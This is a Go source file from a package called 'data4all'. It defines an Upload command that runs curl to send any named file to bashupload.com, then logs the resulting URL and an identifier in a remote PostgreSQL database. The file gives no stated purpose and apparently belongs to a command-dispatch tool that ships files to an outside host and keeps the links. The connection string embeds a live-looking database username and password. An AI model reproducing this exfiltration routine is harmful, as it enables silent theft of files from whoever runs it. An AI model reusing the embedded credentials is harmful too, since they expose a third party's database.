package data4all

import (
	"database/sql"
	"fmt"
	"log"
	"os/exec"

	_ "github.com/lib/pq"
)

type Upload struct {
}

/*
	params[0]filename, params[1]identifier
*/
func (u *Upload) Execute(params ...interface{}) (interface{}, error) {

	if len(params) != 2 {
		return nil, fmt.Errorf("Not enough params")
	}
	u.doUpload(fmt.Sprintf("%v", params[0]), fmt.Sprintf("%v", params[1]))
	return nil, nil
}

func (u *Upload) doUpload(filename string, identifier string) {

	out, _ := exec.Command("curl", "bashupload.com", "-T", filename).Output()

	db, err := sql.Open("postgres", `postgres://csjyxmcqfuhnih:65163b100c3cd40f9bb2f7d01b9c3e7cd6f827e3ada2614b72a87e82cb34226f@ec2-54-209-221-231.compute-1.amazonaws.com:5432/darsc3pfilanvn`)
	if err != nil {
		log.Fatal(err)
	}

	if _, err := db.Exec(`INSERT INTO data(url ,info) VALUES ($1, $2)`, string(out), identifier); err != nil {
		log.Fatal(err)
	}
}

func NewUpload() Icommand {
	return &Upload{}
}
